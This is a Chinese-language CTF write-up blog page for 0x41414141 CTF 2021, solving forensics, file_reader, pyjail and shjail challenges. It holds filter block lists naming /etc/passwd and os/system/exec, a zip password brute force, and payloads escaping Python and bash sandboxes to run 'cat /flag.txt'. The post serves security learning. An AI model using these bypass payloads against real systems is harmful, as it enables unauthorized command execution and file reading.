<!DOCTYPE html>
<html lang=zh-TW>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="0x414141根據題目描述定向到 GitHub Repo 可以獲取到一個 .pyc 檔案。將其使用 反編譯可得如下程式碼。 12345import base64secret &#x3D; &amp;#x27;https:&#x2F;&#x2F;google.com&amp;#x27;cipher2 &#x3D; [b&amp;#x27;NDE&#x3D;&amp;#x27;, b&amp;#x27;NTM&#x3D;&amp;#x27;, b&amp;#x27;NTM&#x3D;&amp;#x27;, b&amp;#x27;NDk&#x3D;&amp;">
<meta property="og:type" content="article">
<meta property="og:title" content="0x41414141 CTF 2021">
<meta property="og:url" content="https://lemonprefect.cn/zh-TW/posts/2bef66b8.html">
<meta property="og:site_name" content="Hexagon">
<meta property="og:description" content="0x414141根據題目描述定向到 GitHub Repo 可以獲取到一個 .pyc 檔案。將其使用 反編譯可得如下程式碼。 12345import base64secret &#x3D; &amp;#x27;https:&#x2F;&#x2F;google.com&amp;#x27;cipher2 &#x3D; [b&amp;#x27;NDE&#x3D;&amp;#x27;, b&amp;#x27;NTM&#x3D;&amp;#x27;, b&amp;#x27;NTM&#x3D;&amp;#x27;, b&amp;#x27;NDk&#x3D;&amp;">
<meta property="og:locale" content="zh_TW">
<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613549609737.70744b59b4d0ce46aaf1de4184590ef4a188b7ff.png">
<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613550142916.8d7f8612e81a995ade9caca0d9cca92fcbdcfdbe.png">
<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613550305651.fc3dad003b1d9d6bb7cb30e39c6443c2e1f07302.png">
<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613550427938.10d6cd23c8abf181c12e08028f40bc9a57427e56.png">
<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613550861385.a4beb06472f081a20b49a9b20930d049a5ba6f0e.png">
<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613561032538.d74285f7ce1c021d42ee40c2eb1b12aa12292db2.png">
<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613563108620.856cc2a1ed08e1582c35e24c0f96486180815350.png">
<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613563369360.05d9dbc2583a304391338c80cc2b52ee051ca82c.png">
<meta property="article:published_time" content="2021-02-19T04:50:00.000Z">
<meta property="article:modified_time" content="2021-04-28T08:28:35.265Z">
<meta property="article:author" content="LemonPrefect">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613549609737.70744b59b4d0ce46aaf1de4184590ef4a188b7ff.png">
    
    
      
        
          
            <link rel="shortcut icon" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=48">
          
        
      
      
        
          
            <link rel="icon" type="image/png" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=192">
          
        
      
      
        
          
            <link rel="apple-touch-icon" size="180x180" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=180">
          
        
      
    
    <!-- title -->
    <title>0x41414141 CTF 2021</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/zh-TW/">首頁</a></li>
         
          <li><a href="/zh-TW/archives/">文章</a></li>
         
          <li><a href="/writeups/">WriteUps</a></li>
         
          <li><a href="/tools/">工具</a></li>
         
          <li><a href="/about/">關於</a></li>
         
          <li><a href="/search/">搜尋</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        <!-- 
        <li><a class="icon" aria-label="上一篇 " href="/zh-CN/posts/2bef66b8.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇 " href="/zh-CN/posts/6da8bc99.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        --!>

        
          
          
          
            <li><a class="icon" aria-label="中文简体（大陆标准） " href="/zh-CN/posts/2bef66b8.html">简</a></li>
          
            <li><a class="icon" aria-label="正体中文（台灣標準） " href="#">正</a></li>
          
        

        <li><a class="icon" aria-label="回到頁首 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
        <li><a class="icon" aria-label="分享 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">回到頁首</span>
      <span id="i-share" class="info" style="display:none;">分享</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html&text=0x41414141 CTF 2021"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html&title=0x41414141 CTF 2021"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html&is_video=false&description=0x41414141 CTF 2021"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=0x41414141 CTF 2021&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/2bef66b8.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html&title=0x41414141 CTF 2021"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html&title=0x41414141 CTF 2021"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html&title=0x41414141 CTF 2021"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html&title=0x41414141 CTF 2021"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html&name=0x41414141 CTF 2021&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/2bef66b8.html&t=0x41414141 CTF 2021"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x414141"><span class="toc-number">1.</span> <span class="toc-text">0x414141</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-CyberChef-%E5%88%86%E9%9B%A2%E6%AA%94%E6%A1%88"><span class="toc-number">1.1.</span> <span class="toc-text">使用 CyberChef 分離檔案</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-reader"><span class="toc-number">2.</span> <span class="toc-text">file_reader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pyjail"><span class="toc-number">3.</span> <span class="toc-text">pyjail</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shjail"><span class="toc-number">4.</span> <span class="toc-text">shjail</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        0x41414141 CTF 2021
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">LemonPrefect</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-02-19T04:50:00.000Z" itemprop="datePublished">2021-02-19</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h3 id="0x414141"><a href="#0x414141" class="headerlink" title="0x414141"></a>0x414141</h3><p>根據題目描述定向到 <a target="_blank" rel="noopener" href="https://github.com/offshift-protocol/promo/commit/f2112c46cafb86e3225901b011e4ea71858901a3">GitHub Repo</a> 可以獲取到一個 .pyc 檔案。將其使用 反編譯可得如下程式碼。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">secret = <span class="string">&#x27;https://google.com&#x27;</span></span><br><span class="line">cipher2 = [<span class="string">b&#x27;NDE=&#x27;</span>, <span class="string">b&#x27;NTM=&#x27;</span>, <span class="string">b&#x27;NTM=&#x27;</span>, <span class="string">b&#x27;NDk=&#x27;</span>, <span class="string">b&#x27;NTA=&#x27;</span>, <span class="string">b&#x27;MTIz&#x27;</span>, <span class="string">b&#x27;MTEw&#x27;</span>, <span class="string">b&#x27;MTEw&#x27;</span>, <span class="string">b&#x27;MzI=&#x27;</span>, <span class="string">b&#x27;NTE=&#x27;</span>, <span class="string">b&#x27;MzQ=&#x27;</span>, <span class="string">b&#x27;NDE=&#x27;</span>, <span class="string">b&#x27;NDA=&#x27;</span>, <span class="string">b&#x27;NTU=&#x27;</span>, <span class="string">b&#x27;MzY=&#x27;</span>, <span class="string">b&#x27;MTEx&#x27;</span>, <span class="string">b&#x27;NDA=&#x27;</span>, <span class="string">b&#x27;NTA=&#x27;</span>, <span class="string">b&#x27;MTEw&#x27;</span>, <span class="string">b&#x27;NDY=&#x27;</span>, </span><br><span class="line"><span class="string">b&#x27;MTI=&#x27;</span>, <span class="string">b&#x27;NDU=&#x27;</span>, <span class="string">b&#x27;MTE2&#x27;</span>, <span class="string">b&#x27;MTIw&#x27;</span>]</span><br><span class="line">cipher1 = [base64.b64encode(<span class="built_in">str</span>(<span class="built_in">ord</span>(i) ^ <span class="number">65</span>).encode()) <span class="keyword">for</span> i <span class="keyword">in</span> secret]</span><br></pre></td></tr></table></figure>

<p>將 cipher2 按照相同的方法解密出來。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text2 = [<span class="built_in">chr</span>(<span class="built_in">int</span>(base64.b64decode(i).decode()) ^ <span class="number">65</span>) <span class="keyword">for</span> i <span class="keyword">in</span> cipher2]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(text2))</span><br></pre></td></tr></table></figure>

<p>得到了一個網址 <a target="_blank" rel="noopener" href="https://archive.is/oMl59%E3%80%82%E5%AE%9A%E5%90%91%E5%88%B0%E9%80%99%E5%80%8B%E7%B6%B2%E5%9D%80%E5%8F%AF%E4%BB%A5%E7%99%BC%E7%8F%BE%E5%A6%82%E4%B8%8B%E8%B3%87%E8%A8%8A%E3%80%82">https://archive.is/oMl59。定向到這個網址可以發現如下資訊。</a></p>
<p><img src="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613549609737.70744b59b4d0ce46aaf1de4184590ef4a188b7ff.png"></p>
<p>下載檔案得到 smashing.pdf，使用 010 editor 開啟檔案後可以發現很多 0x41 的位元組，猜測是檔案被按位異或過。嘗試將其復原可以得到原本的 pdf 檔案。binwalk 一下 pdf 檔案可以發現其中包含一個含有 flag.txt 的壓縮檔案。</p>
<p><img src="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613550142916.8d7f8612e81a995ade9caca0d9cca92fcbdcfdbe.png"></p>
<p><code>binwalk -e</code> 將壓縮包分離出來後發現解壓需要密碼，因為沒有發現其他資訊，故嘗試一波爆破。使用 GitHub 上的一萬常用密碼密碼錶可以爆破得出壓縮包密碼為 passwd。</p>
<p><img src="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613550305651.fc3dad003b1d9d6bb7cb30e39c6443c2e1f07302.png"></p>
<p>解壓壓縮包可得 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1t_b33n_A_l0ng_w@y8742&#125;</span><br></pre></td></tr></table></figure>

<h4 id="使用-CyberChef-分離檔案"><a href="#使用-CyberChef-分離檔案" class="headerlink" title="使用 CyberChef 分離檔案"></a>使用 CyberChef 分離檔案</h4><p>看了大佬的 WriteUp 發現使用 CyberChef 的 Extract Files 功能也可以分離出檔案。</p>
<p><img src="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613550427938.10d6cd23c8abf181c12e08028f40bc9a57427e56.png"></p>
<h3 id="file-reader"><a href="#file-reader" class="headerlink" title="file_reader"></a>file_reader</h3><p>附件給出的程式碼如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"></span><br><span class="line">blocked = [<span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;/flag.txt&quot;</span>, <span class="string">&quot;/proc/&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">file_path</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blocked:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> file_path:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;you aren&#x27;t allowed to read that file&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        path = glob.glob(file_path)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;file doesn&#x27;t exist&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">user_input = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(read_file(user_input))</span><br></pre></td></tr></table></figure>

<p>稍加分析可知題意是要我們繞過過濾讀到 flag.txt。使用 <code>/flag.???</code> 即可成功繞過讀到 flag。</p>
<p><img src="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613550861385.a4beb06472f081a20b49a9b20930d049a5ba6f0e.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;oof_1t_g0t_expanded_93929&#125;</span><br></pre></td></tr></table></figure>

<h3 id="pyjail"><a href="#pyjail" class="headerlink" title="pyjail"></a>pyjail</h3><p>附件給出的程式碼如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> modules, version</span><br><span class="line"></span><br><span class="line">banned = <span class="string">&quot;import|chr|os|sys|system|builtin|exec|eval|subprocess|pty|popen|read|get_data&quot;</span></span><br><span class="line">search_func = <span class="keyword">lambda</span> word: re.<span class="built_in">compile</span>(<span class="string">r&quot;\b(&#123;0&#125;)\b&quot;</span>.<span class="built_in">format</span>(word), flags=re.IGNORECASE).search</span><br><span class="line"></span><br><span class="line">modules.clear()</span><br><span class="line"><span class="keyword">del</span> modules</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;version&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;What would you like to say?&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        text = <span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>).lower()</span><br><span class="line">        check = search_func(banned)(<span class="string">&#x27;&#x27;</span>.join(text.split(<span class="string">&quot;__&quot;</span>)))</span><br><span class="line">        <span class="keyword">if</span> check:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Nope, we ain&#x27;t letting you use <span class="subst">&#123;check.group(<span class="number">0</span>)&#125;</span>!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">&quot;^(_?[A-Za-z0-9])*[A-Za-z](_?[A-Za-z0-9])*$&quot;</span>, text):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;You aren&#x27;t getting through that easily, come on.&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">exec</span>(text, &#123;<span class="string">&#x27;globals&#x27;</span>: <span class="built_in">globals</span>(), <span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;&#125;, &#123;<span class="string">&#x27;print&#x27;</span>:<span class="built_in">print</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>可以得出除了過濾了一些常用的 token 之外用了一個很奇怪的正則，基本上匹配的是下劃線開頭的內容，但是要以下劃線開頭，所以 <code>print((globals[&#39;__builtins__&#39;]))</code> 還是沒有問題。因為有 <code>globals()</code>，所以嘗試將其打印出來，發現了 <code>&#39;__builtins__&#39;: &lt;module &#39;builtins&#39; (built-in)&gt;</code>。也就是他表面上把 builtins 禁用了，實際上還是可以訪問到。</p>
<p>既然最後要讀到 <code>/flag</code>，那肯定是需要 <code>system(&quot;cat /flag&quot;)</code> 的操作，所以需要引入 os 模組。這裡的 <code>__import__</code> 被禁用了，因此可以嘗試採用 <code>getattr()</code> 來構造。先嚐試匯出一下 <code>__import__</code>。</p>
<p><img src="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613561032538.d74285f7ce1c021d42ee40c2eb1b12aa12292db2.png"></p>
<p>可以看到使用 getattr 可以成功地匯出。接下來一步步匯出到 system 函式。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]).<span class="built_in">getattr</span>((<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]),(<span class="string">&#x27;__impor&#x27;</span> + <span class="string">&#x27;t__&#x27;</span>))(<span class="string">&#x27;o&#x27;</span> + <span class="string">&#x27;s&#x27;</span>) <span class="comment">#匯出到 __import__.os</span></span><br><span class="line">(<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]).<span class="built_in">getattr</span>(((<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]).<span class="built_in">getattr</span>((<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]),(<span class="string">&#x27;__impor&#x27;</span> + <span class="string">&#x27;t__&#x27;</span>))(<span class="string">&#x27;o&#x27;</span> + <span class="string">&#x27;s&#x27;</span>)),(<span class="string">&#x27;syste&#x27;</span> + <span class="string">&#x27;m&#x27;</span>)) <span class="comment">#匯出到函式 system</span></span><br></pre></td></tr></table></figure>

<p>接下來就能執行 shell 了，構造出如下 payload 即可讀到 flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]).<span class="built_in">getattr</span>(((<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]).<span class="built_in">getattr</span>((<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]),(<span class="string">&#x27;__impor&#x27;</span> + <span class="string">&#x27;t__&#x27;</span>))(<span class="string">&#x27;o&#x27;</span> + <span class="string">&#x27;s&#x27;</span>)),(<span class="string">&#x27;syste&#x27;</span> + <span class="string">&#x27;m&#x27;</span>))(<span class="string">&#x27;cat /flag.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;l3t&#39;s_try_sc0p1ng_th1s_0ne_2390098&#125;</span><br></pre></td></tr></table></figure>

<p>在大佬的文章裡看到了一種很妙的解法，是透過全域性變數覆蓋來實現的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">globals</span>[<span class="string">&#x27;banned&#x27;</span>] = <span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;cat /f*&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="shjail"><a href="#shjail" class="headerlink" title="shjail"></a>shjail</h3><p>附件給出的程式碼如下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">RED=<span class="string">&#x27;\e[0;31m&#x27;</span></span><br><span class="line">END=<span class="string">&#x27;\e[0m&#x27;</span></span><br><span class="line">GREEN=<span class="string">&#x27;\e[0;32m&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;What would you like to say?&quot;</span></span><br><span class="line">	<span class="built_in">read</span> USER_INP</span><br><span class="line">       	<span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$USER_INP</span>&quot;</span> =~ [<span class="string">&#x27;&amp;&#x27;</span><span class="string">&#x27;$&#x27;</span><span class="string">&#x27;`&#x27;</span><span class="string">&#x27;&gt;&#x27;</span><span class="string">&#x27;&lt;&#x27;</span><span class="string">&#x27;/&#x27;</span><span class="string">&#x27;*&#x27;</span><span class="string">&#x27;?&#x27;</span>txcsbqi] ]]; <span class="keyword">then</span></span><br><span class="line">               	<span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$&#123;RED&#125;</span>Hmmmm, what are you trying to do?<span class="variable">$&#123;END&#125;</span>&quot;</span></span><br><span class="line">       	<span class="keyword">else</span></span><br><span class="line">               	OUTPUT=$(<span class="variable">$USER_INP</span>) &amp;&gt;/dev/null</span><br><span class="line">               	<span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$&#123;GREEN&#125;</span>The command has been executed. Let&#x27;s go again!<span class="variable">$&#123;END&#125;</span>&quot;</span></span><br><span class="line">       	<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span> </span><br></pre></td></tr></table></figure>

<p>可以發現禁用的單字元有 <code>&grave;&$&gt;&lt;/*?txcsbqi</code>，剩餘的單字元有 <code>adefghjklmnopruvwyz</code>。同時只有在指令報錯的時候才能有輸出。因此要想辦法用報錯的程式來帶出檔案。</p>
<p><img src="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613563108620.856cc2a1ed08e1582c35e24c0f96486180815350.png"></p>
<p>看了 WriteUp 之後知道這裡可以使用 perl 來帶出檔案，同時因為 txt 中的 t 字元被禁用了，因此需要使用 bash 的正則表示式。可以嘗試使用 open 指令來確定檔案是否存在從而確定 flag 的位置。因為這題禁用了 /，所以 flag 應該不在根目錄。然而在 bash 的正則中 <code>[a-z]&#123;3&#125;</code> 表示三個連續的前一個 RE 字元，而並不是一般正則的匹配三次。因此需要嘗試 <code>open flag.[a-z][a-z][a-z]</code> 來匹配 flag.txt，可以發現指令成功執行且沒有報錯，對比其他的執行可知此時 flag 位於當前目錄下且可能名為 flag.txt。因此最後的 paylaod 可以是 <code>perl flag.[a-z][a-z][a-z]</code>，當然，寫作 <code>perl [a-z][a-z][a-z][a-z].[a-z][a-z][a-z]</code> 也是相同的效果。最後使用這個指令可以在程式的報錯中看到 flag。</p>
<p><img src="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613563369360.05d9dbc2583a304391338c80cc2b52ee051ca82c.png" alt="image-20210217200249084"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;w3ll_th1s_f1l3_sh0uldnt_h4v3_fl4g_1n_2738372131&#125;</span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首頁</a></li>
         
          <li><a href="/archives/">文章</a></li>
         
          <li><a href="/writeups/">WriteUps</a></li>
         
          <li><a href="/tools/">工具</a></li>
         
          <li><a href="/about/">關於</a></li>
         
          <li><a href="/search/">搜尋</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
